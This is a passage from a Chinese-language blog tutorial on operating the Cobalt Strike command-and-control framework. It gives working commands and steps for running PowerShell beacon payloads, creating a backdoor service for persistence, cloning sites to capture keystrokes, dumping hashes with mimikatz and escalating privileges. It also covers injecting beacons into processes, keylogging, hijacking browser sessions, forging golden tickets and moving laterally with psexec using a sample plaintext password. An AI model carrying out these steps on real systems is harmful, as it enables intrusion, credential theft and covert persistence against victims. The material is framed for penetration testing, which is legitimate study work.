src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078010023-7d6ef4e5-f36c-4a0a-9f7b-00b2e720c817-20220401150224888.png" alt="img"></p><p>将该文档发给其他人，只要他是用word打开，并且开启了宏，我们的CS就会收到弹回来的shell，进程名是rundll32.exe。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078010008-4671fd05-1da7-4179-a57a-7ffe8c606f77-20220401150224751.png" alt="img"></p><p>word开启禁用宏：文件——&gt;选项——&gt;信任中心——&gt;信任中心设置</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078010674-cb03004d-5ed1-439d-8fd5-5d8237a5d266-20220401150224943.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078010855-4fd1c43d-1078-42c6-9fea-49e98833cedb-20220401150224767.png" alt="img"></p><h3 id="Payload-Generator"><a href="#Payload-Generator" class="headerlink" title="Payload Generator"></a>Payload Generator</h3><p>这个模块用于生成各种语言版本的shellcode，然后用其他语言进行编译生成，可参考：<a href="https://xie1997.blog.csdn.net/article/details/106348527">MSF木马的免杀(三)</a></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078010970-2974a413-6e52-45eb-958e-051bca647807-20220401150224906.png" alt="img"></p><p>这里主要讲两个payload：Powershell 和 PowerShell Command 。这两个都是利用powershell进行上线。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078011032-832d0f17-a3a4-4ad4-bb66-03083a3a77a1-20220401150225059.png" alt="img"></p><p><strong>PowerShell</strong></p><p>选择该payload会生成一个payload.ps1文件，可以选择如下方式上线</p><p>powershell下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\payload<span class="token punctuation">.</span>ps1 或 <span class="token punctuation">.</span>\payload<span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078012267-ab43c2a5-8dc0-4f81-b132-147c2e312a7a-20220401150225392.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078012275-b39ca0af-3e8f-444c-93ca-b0b4b727a048-20220401150225319.png" alt="img"></p><p>cmd下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">powershell Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\payload<span class="token punctuation">.</span>ps1 或 powershell <span class="token punctuation">.</span>\payload<span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078012317-d78e6ce0-f474-4983-a5bc-99e389d17295-20220401150225577.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078012428-231f9384-e175-43ad-8783-f31e775e5ded-20220401150225725.png" alt="img"></p><p><strong>PowerShell Command</strong></p><p>选择该payload会生成一个payload.txt文件，可以选择如下方式上线：</p><p>直接复制该文件内容在cmd下运行即可上线</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078017033-52264ca0-39a5-4b96-b05f-fbf965f799ce-20220401150234472.png" alt="img"></p><p>或者也可只保留该文件的base64字段，然后执行如下命令上线</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078014056-358ad4da-f046-4edd-91e2-8cff88b258e9-20220401150227181.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">如果是执行当前路径powershell<span class="token punctuation">;</span>$a<span class="token operator">=</span>Get<span class="token operator">-</span>Content payload<span class="token punctuation">.</span>txt<span class="token punctuation">;</span>powershell <span class="token operator">-</span>enc $a如果是执行指定路径powershell<span class="token punctuation">;</span>$a<span class="token operator">=</span>Get<span class="token operator">-</span>Content <span class="token operator">-</span>Path <span class="token string">"E:\payload.txt"</span><span class="token punctuation">;</span>powershell <span class="token operator">-</span>enc $a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078013367-5c130db8-5de0-41aa-b640-3816b78fd319-20220401150226330.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078013732-c1ff1a8a-0c61-4f3f-a5b4-1299c1fd3280-20220401150226841.png" alt="img"></p><h3 id="Windows-Executable-amp-Windows-Executable-S"><a href="#Windows-Executable-amp-Windows-Executable-S" class="headerlink" title="Windows Executable &amp; Windows Executable(S)"></a>Windows Executable &amp; Windows Executable(S)</h3><p>这两个模块直接用于生成可执行的 exe 文件或 dll 文件。Windows Executable是生成Stager类型的马，而Windows Executable(S) 是生成Stageless类型的马。那Stager和Stageless有啥区别呢？</p><ul><li>Stager是分阶段传送Payload。分阶段啥意思呢？就是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。如果不需要分阶段的话，可以在C2的扩展文件里面把 host_stage 选项设置为 false。</li><li>而Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。但是这种木马有助于避免反溯源，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在CobaltStrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的Stageless类型的木马。</li></ul><p>Windowss Executable(S)相比于Windows Executable，其中包含Beacon的完整payload，不需要阶段性的请求，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078013633-07ed894b-6ea0-4710-a83d-d195d04955cf-20220401150226981.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078014224-d0c17a5e-e17b-4f8e-b838-66ffffe7ac56-20220401150227128.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#注意，等号（=）后面要有空格</span>sc create autoRunBackDoor binPath<span class="token operator">=</span> <span class="token string">"cmd.exe /c C:\users\administrator\desktop\cs.exe"</span> start<span class="token operator">=</span> auto DisplayName<span class="token operator">=</span> autoRunBackDoor<span class="token comment">#开启某个系统服务</span>sc start autoRunBackDoor <span class="token comment">#停止某个系统服务</span>sc stop autoRunBackDoor <span class="token comment"># 删除某个系统服务</span>sc delete service_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078014518-cbed7fd5-f0c7-4801-8f29-50339a64d599-20220401150227174.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078014739-91f050ce-2932-4dff-bd49-9839f9cc6834-20220401150227402.png" alt="img"></p><h2 id="创建攻击Attacks-钓鱼攻击"><a href="#创建攻击Attacks-钓鱼攻击" class="headerlink" title="创建攻击Attacks(钓鱼攻击)"></a><strong>创建攻击Attacks(钓鱼攻击)</strong></h2><p>点击中间的Attacks——&gt;Web Drive-by（网站钓鱼攻击）</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078015012-facaced0-8144-4775-bd0b-e08451c0582b-20220401150227304.png" alt="img"></p><ul><li>web服务管理 对开启的web服务进行管理；</li><li>克隆网站 克隆网站，可以记录受害者提交的数据；</li><li>文件下载 提供一个本地文件下载，可以修改Mime信息。可以配合DNS欺骗实现挂马效果使用</li><li>Scripted Web Delivery(S) 基于Web的攻击测试脚本，自动生成可执行的payload ，通常用这个模块来生成powershell命令反弹shell</li><li>签名Applet攻击 启动一个Web服务以提供自签名Java Applet的运行环境;</li><li>智能攻击 自动检测Java版本并利用已知的exploits绕过security；</li><li>信息搜集 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。</li></ul><h3 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a>克隆网站</h3><p>该模块用来克隆一个网站，来获取用户的键盘记录</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078015336-09801090-262d-4392-b8bd-d3883b8734a4-20220401150227422.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078015436-83e781b8-04a7-4ffa-bab7-990b86bddebb-20220401150227503.png" alt="img"></p><p>然后访问URL</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078016762-80c38c3b-8be0-4832-ae11-7667d13052a6-20220401150229669.png" alt="img"></p><p>cs的web日志可以查看到目标访问的键盘记录</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078016158-6faa5366-ccb1-43f3-b4dc-a72ef7448830-20220401150228430.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078016189-88634cbb-16e1-4bd5-b506-e13444a40ba7-20220401150227670.png" alt="img"></p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>该模块用来获取用户的系统信息、浏览器信息。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078016421-2d811b15-ea9d-40a5-b16a-ac96837830c4-20220401150227788.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078017229-676df37e-3dbe-4798-81de-35b580c2c051-20220401150227887.png" alt="img"></p><p>然后只要目标访问我们的这个链接，就会自动跳转到百度，并且我们的cs可以获取到目标系统和浏览器的信息</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078017234-1af069c9-ff4a-4036-85ec-8f4e789973ca-20220401150227977.png" alt="img"></p><h2 id="视图View"><a href="#视图View" class="headerlink" title="视图View"></a><strong>视图View</strong></h2><p>点击中间的View</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078017524-7eb35625-8733-42b6-8bc1-45883f75fe73-20220401150228076.png" alt="img"></p><ul><li>Applications 显示受害者机器的应用信息；</li><li>Credentials 显示受害者机器的凭证信息，通过hashdump和mimikatz获取的密码都保存在这里；</li><li>Downloads 查看从被控机器上下载的文件；</li><li>Event Log 可以看到事件日志，清楚的看到系统的事件,并且团队可以在这里聊天;</li><li>Keystrokes 查看键盘记录；</li><li>Proxy Pivots 查看代理信息；</li><li>Screenshots 查看屏幕截图；</li><li>Script Console 在这里可以加载各种脚本以增强功能，脚本地址：<a href="https://github.com/rsmudge/cortana-scripts">https://github.com/rsmudge/cortana-scripts</a></li><li>Targets 查看目标；</li><li>Web Log 查看web日志。</li></ul><h2 id="对被控主机的操作"><a href="#对被控主机的操作" class="headerlink" title="对被控主机的操作"></a>对被控主机的操作</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">Interact       打开beaconAccess dump hashes   获取<span class="token builtin">hash</span>Elevate       提权Golden Ticket 生成黄金票据注入当前会话MAke token    凭证转换Run Mimikatz  运行 Mimikatz Spawn As      用其他用户生成Cobalt Strike的beaconExploreBrowser Pivot 劫持目标浏览器进程Desktop<span class="token punctuation">(</span>VNC<span class="token punctuation">)</span>  桌面交互File Browser  文件浏览器Net View      命令Net ViewPort scan     端口扫描Process <span class="token builtin">list</span>  进程列表Screenshot    截图PivotingSOCKS Server 代理服务Listener     反向端口转发Deploy VPN   部署VPNSpawn            新的通讯模式并生成会话Session          会话管理，删除，心跳时间，退出，备注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="抓取hash和dump明文密码"><a href="#抓取hash和dump明文密码" class="headerlink" title="抓取hash和dump明文密码"></a>抓取hash和dump明文密码</h3><p>这两项功能都需要管理员权限，如果权限不足，先提权</p><ul><li>抓取密码哈希：右键被控主机——&gt;Access——&gt;Dump Hashes</li><li>利用mimikatz抓取明文密码：右键被控主机——&gt;Access——&gt;Run Mimikatz</li></ul><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078017961-fcd038ae-4519-452f-8d8e-da738ae01eb4-20220401150228139.png" alt="img"></p><p>抓取密码哈希，也可以直接输入：<strong>hashdump</strong></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078018004-e6e89cf8-bd5d-4832-99b7-84b94f5f4ec7-20220401150228198.png" alt="img"></p><p>使用mimikatz抓取明文密码，也可以直接输入：<strong>logonpasswords</strong></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078018170-36113581-d912-493c-998f-1a3f1022e2ab-20220401150228289.png" alt="img"></p><p>抓取完之后，点击凭证信息，就会显示我们抓取过的哈希或者明文。这里我们也可以手动添加或修改凭证信息</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078018486-52a41480-a72b-40f4-af18-28e132a7816e-20220401150228593.png" alt="img"></p><h3 id="提权-Elevate"><a href="#提权-Elevate" class="headerlink" title="提权(Elevate)"></a>提权(Elevate)</h3><p>当获取的当前权限不够时，可以使用提权功能</p><p>右键被控主机——&gt;Access——&gt;Elevate</p><p>亲测Windows Server 2008R2 、Win7 及以下系统可用。Win10不可用 </p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078018499-0e002afd-db97-4aef-ba2a-83ce4c5df00a-20220401150229313.png" alt="img"></p><p>默认有三个提权payload可以使用，分别是MS14-058、uac-dll、uac-token-duplication 。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078018793-90705f7b-9ab8-4c4b-9aa5-435247cdc125-20220401150228669.png" alt="img"></p><p>我们选中MS14-058，点击Launch</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078019195-1c3d13a7-665d-4437-9935-83ab391bb5bf-20220401150228740.png" alt="img"></p><p>之后就弹回来一个system权限的beacon</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078019401-535db2d3-9adb-4868-9fa8-f5853d90dab9-20220401150229012.png" alt="img"></p><p>我们也可以自己加入一些提权脚本进去。在Github上有一个提权工具包，使用这个提权工具包可以增加几种提权方法：<a href="https://github.com/rsmudge/ElevateKit">GitHub - rsmudge&#x2F;ElevateKit: The Elevate Kit demonstrates how to use third-party privilege escalation attacks with Cobalt Strike’s Beacon payload.</a> 。我们下载好该提权工具包后</p><p>如下，</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078019468-8e78c279-f1d2-49b1-91ab-579dd1bc29dd-20220401150229126.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078019757-0353a4e8-b766-4c85-904b-57f30cefb8dd-20220401150229343.png" alt="img"></p><p>再打开我们的提权，可以看到多了几种提权方式了</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078019734-407c6df9-9ff8-4cc1-a6aa-2b44ab8fd678-20220401150230276.png" alt="img"></p><h3 id="利用被控主机建立Socks4代理"><a href="#利用被控主机建立Socks4代理" class="headerlink" title="利用被控主机建立Socks4代理"></a>利用被控主机建立Socks4代理</h3><p>当我们控制的主机是一台位于公网和内网边界的服务器 ，我们想利用该主机继续对内网进行渗透，于是，我们可以利用CS建立socks4A代理</p><p>右键被控主机——&gt;Pivoting——&gt;SOCKS Server</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078020019-a85e6bb0-437a-4dc5-9138-0782b1c94978-20220401150229400.png" alt="img"></p><p>这里是SOCKS代理运行的端口，任意输入一个未占用的端口即可，默认CS会给出一个，我们直接点击Launch即可。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078020408-ae055b97-70fd-46d9-bff7-0e9d75e20cd6-20220401150229457.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078020504-efd40533-57e1-49b1-8e96-8f96dcec5f16-20220401150229501.png" alt="img"></p><p>于是，我们在自己的主机上设置Socks4代理。代理ip是我们CS服务端的ip，端口即是 38588。</p><p>如果我们想查看整个CS代理的设置，可以点击View——&gt;Proxy Pivots </p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078020512-cbf61170-0f4d-4121-93fc-9d546bcd70d6-20220401150229564.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078020876-ebcd721c-08b4-420f-9002-9fd210b04b7b-20220401150229606.png" alt="img"></p><p>然后我们可以直接在浏览器设置socks4代理</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078021065-83ee4dfc-f0db-4976-a90f-fb6bac7e2b5d-20220401150229742.png" alt="img"></p><p>或者可以点击Tunnel，然后会给我们一个MSF的代理：setg Proxies socks4:xx.xx.xx.xx:38588</p><h3 id="进程列表-注入进程，键盘监控"><a href="#进程列表-注入进程，键盘监控" class="headerlink" title="进程列表(注入进程，键盘监控)"></a>进程列表(注入进程，键盘监控)</h3><p>右键被控主机——&gt;Explore——&gt;Process List</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078021112-b5cae9b8-079c-401b-b487-a7943d06ec52-20220401150229743.png" alt="img"></p><p>即可列出进程列表</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078021358-c01206ad-3bc5-4e15-9b07-347d3886a6d0-20220401150230142.png" alt="img"></p><p>选中该进程，Kill为杀死该进程，Refresh为刷新该进程，Inject 则是把beacon注入进程，Log Keystrokes为键盘记录，Screenshot 为截图，Stea Token为窃取运行指定程序的用户令牌</p><p>这里着重讲一下注入进程和键盘记录</p><p><strong>Inject注入进程</strong></p><p>选择进程，点击Inject，随后选择监听器，点击choose，即可发现CobaltStrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon会话。该功能可以把你的beacon会话注入到另外一个程序之中，注入之后，除非那个正常进程被杀死了，否则我们就一直可以控制该主机了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">inject  进程PID  进程位数  监听<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078021337-a77b3227-6451-44ad-acb5-7370d659a6c3-20220401150229937.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078021624-d77c9310-278b-4d89-95da-151d19ca9f50-20220401150230069.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078022279-ac45f4dc-421f-4b30-a5df-53a776b69f4e-20220401150230616.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078022419-088e5e60-bf2b-4b64-a9e6-b7702387eebd-20220401150230247.png" alt="img"></p><p><strong>键盘记录</strong></p><p>任意选择一个进程，点击<strong>Log Keystrokes</strong>，即可监听该主机的键盘记录</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">keylogger  进程PID  进程位数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078022884-73a8721b-ee67-406b-a034-6edf69861402-20220401150230266.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078022881-ac3a973e-0744-4ab2-9928-13bfcf73ad42-20220401150230314.png" alt="img"></p><p>查看键盘记录结果：点击钥匙一样的按钮，就可以在底下看到键盘记录的详细了，会监听所有的键盘记录，而不只是选中的进程的键盘记录</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078023054-282f896b-6f65-4196-b014-bf6087e02bf4-20220401150230506.png" alt="img"></p><p>键盘监听记录，也可以直接输入 <strong>keylogger</strong></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078023340-9c3a6010-25bd-4f06-8830-d26c6646a40c-20220401150231268.png" alt="img"></p><h3 id="浏览器代理Browser-Pivot"><a href="#浏览器代理Browser-Pivot" class="headerlink" title="浏览器代理Browser Pivot"></a>浏览器代理Browser Pivot</h3><p>使用浏览器代理功能，我们可以注入到目标机器的浏览器进程中。然后在本地浏览器中设置该代理，这样，我们可以在本地浏览器上访问目标机器浏览器已经登录的网站，而不需要登录。但是目前浏览器代理只支持IE浏览器。如下，目标主机的IE浏览器目前在访问fofa，并且已登录。现在我们想利用浏览器代理在本地利用目标主机身份进行访问。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078023624-4aad5c84-e81d-4197-8052-de86e843e080-20220401150230698.png" alt="img"></p><p>选中目标，邮件浏览器代理，然后选中IE浏览器的进程</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078023699-5b6b3f85-995c-4201-b457-b7b8beccf9fd-20220401150230568.png" alt="img"></p><p>这里看到IE浏览器有两个进程，分别是 6436和6544，我们随便选中一个即可。我这里选择 6544进程，然后下面会有一个默认的代理服务端口。点击开始</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078023819-a5d16c30-6a0b-4b32-b585-d8edc73dbd29-20220401150230670.png" alt="img"></p><p>可以看到命令行如下：browserpivot 6544 x86</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078024023-0009a7db-f7b1-4602-aa23-52b7bdeef5e2-20220401150231227.png" alt="img"></p><p>然后视图代理信息可以看到刚刚建立的浏览器代理。这里的意思是，TeamServer监听59398和26193端口。流程是这样，我们将流量给59398端口，59398端口将流量给26193端口，26193将流量给目标主机的26193端口。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078024246-e0403434-274d-4fdf-9e1c-51002dc4c3b9-20220401150230758.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078024463-543a4a13-970f-40c5-a708-fd346d94bb3e-20220401150230772.png" alt="img"></p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078024672-6ab81ab4-e6be-4cdc-9dd9-173a792eab6d-20220401150230914.png" alt="img"></p><p>我们这里代理设置TeamServer服务器的ip和59398端口即可。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078024865-7516dea7-d96f-4d26-8acc-5921fe244805-20220401150230884.png" alt="img"></p><p>访问Fofa，可以看到以目标身份登录了网站。</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078024989-b25a1358-8a95-4ec2-95d7-73295612be8e-20220401150231120.png" alt="img"></p><h3 id="生成黄金票据注入当前会话-Golden-Ticket"><a href="#生成黄金票据注入当前会话-Golden-Ticket" class="headerlink" title="生成黄金票据注入当前会话(Golden Ticket)"></a>生成黄金票据注入当前会话(Golden Ticket)</h3><p>生成黄金票据的前提是我们已经获得了krbtgt用户的哈希：9ce0b40ed1caac7523a22d574b32deb2 。并且已经获得一个以域用户登录的主机权限</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078024989-d7df5e47-4976-4dcd-b5d4-add3b3c71670-20220401150230959.png" alt="img"></p><p>右键当前获得的主机——&gt;Access——&gt;Golden Ticket</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078025131-5247d075-fe37-457b-9c30-141f1aa23133-20220401150231130.png" alt="img"></p><p>在弹出来的对话框中输入以下：</p><ul><li>User：要伪造用户名，这里我们一般填administrator</li><li>Domain：域名</li><li>Domain SID：域SID</li><li>Krbtgt Hash：krbtgt用户的哈希</li></ul><p>然后点击Build即可</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078026014-811fff7e-6ded-43e0-a49a-a641bbf8aa51-20220401150231863.png" alt="img"></p><p>这是输入框自动执行的mimikatz命令，如图票据传递攻击成功。我们查看域控的C盘，输入如下命令，注意这里域控必须是主机名形式，而不能是ip</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shell  <span class="token builtin">dir</span> \\win2008<span class="token punctuation">.</span>xie<span class="token punctuation">.</span>com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078026152-1d262dd1-5fab-4085-a87b-9a91c64a4b18-20220401150231788.png" alt="img"></p><p>然后可以导出域内所有用户的哈希了</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078027352-e409b8c5-09a7-42b6-81a8-0d764ef46598-20220401150233377.png" alt="img"></p><h3 id="凭证转换-Make-Token"><a href="#凭证转换-Make-Token" class="headerlink" title="凭证转换(Make Token)"></a>凭证转换(Make Token)</h3><p>如果我们已经获得了计算机的本地管理员或域管理员的账号密码，就可以使用此模块生成令牌，此时生成的令牌具有指定用户的身份。</p><ul><li>rev2self: Revert to your original access token(还原到原始的访问令牌)</li><li>make_token: Clone the current access token and set it up to pass the specified username and password when you interact with network resources. This command does not<br>validate the credentials you provide and it has no effect on local actions.（克隆当前访问令牌并将其设置为传递指定的用户名以及与网络资源交互时的密码。 这个命令没有<br>验证您提供的凭据，并且它对本地操作没有影响。）</li><li>psexec: Spawn a session on a remote host. This command generates an executable, copies it to the target, creates a service to run it, and cleans up after itself. You must specify which share (e.g., ADMIN$ or C$) to copy the file to。(在远程主机上生成会话。 此命令生成一个可执行文件，将其复制到目标，创建一个服务来运行它，并在其本身之后进行清理。 您必须指定要将文件复制到哪个共享(例如，ADMIN$或C$。)</li></ul><p>右键当前获得的主机——&gt;Access——&gt;Make Token</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078026119-25667bf0-6a1b-48d5-8bc3-b312d322ceb3-20220401150233388.png" alt="img"></p><p>输入已经获得了域用户的账号密码和域名，点击Build</p><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078026213-f56b60a9-e12b-48c0-b67a-a6deef72bf7a-20220401150231998.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rev2self  <span class="token comment">#这一步可以省略</span>make_token xie\administrator P@ssword123jump psexec <span class="token number">192.168</span><span class="token number">.106</span><span class="token number">.10</span> smbunlink <span class="token number">192.168</span><span class="token number">.106</span><span class="token number">.10</span>  <span class="token comment">#取消连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078028092-86ea88b1-813f-4c58-85c5-0de5e622ea5f-20220401150232494.png" alt="img"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>右键——&gt;目标——&gt;端口扫描，然后填入要扫描的端口和网段。这里我们也可以直接执行命令：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">portscan <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.1</span><span class="token operator">-</span><span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.10</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">445</span> arp  <span class="token number">1024</span>portscan <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.1</span><span class="token operator">-</span><span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.10</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">445</span> icmp <span class="token number">1024</span>portscan <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.1</span><span class="token operator">-</span><span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.10</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">445</span> none <span class="token number">1024</span>一般我们直接运行命令portscan <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">445</span><span class="token punctuation">,</span><span class="token number">1433</span><span class="token punctuation">,</span><span class="token number">3306</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/gong-ju-de-shi-yong/cobaltstrike-de-shi-yong/1635078027333-98330e21-40c4-4d89-be50-136c3573e477-20220401150232144.png" alt="img"></p><p><img 